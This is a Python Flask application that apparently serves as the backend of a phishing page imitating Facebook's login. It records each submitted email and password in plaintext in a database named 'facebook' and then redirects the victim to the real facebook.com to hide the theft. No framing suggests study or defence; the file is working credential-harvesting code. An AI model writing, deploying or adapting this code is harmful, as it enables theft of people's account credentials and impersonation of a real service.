from flask import Flask, request, redirect, render_template
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/facebook'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class User(db.Model):
    __tablename__ = 'login'  # Specify the table name
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form['email']
        password = request.form['password']
        
        
        # Create a new User instance
        new_user = User(username=username, password=password)
        
        # Add the new user to the session
        db.session.add(new_user)
        
        # Commit the session to save the new user to the database
        db.session.commit()
        
        # Redirect to '/' as a placeholder
        return redirect('https://www.facebook.com')
    
    except Exception as e:
        # Log the exception
        print(f"An error occurred: {str(e)}")
        # Rollback the session if there's an error
        db.session.rollback()
        return f"An error occurred while processing your request: {str(e)}", 500

if __name__ == '__main__':
    app.run(debug=True)
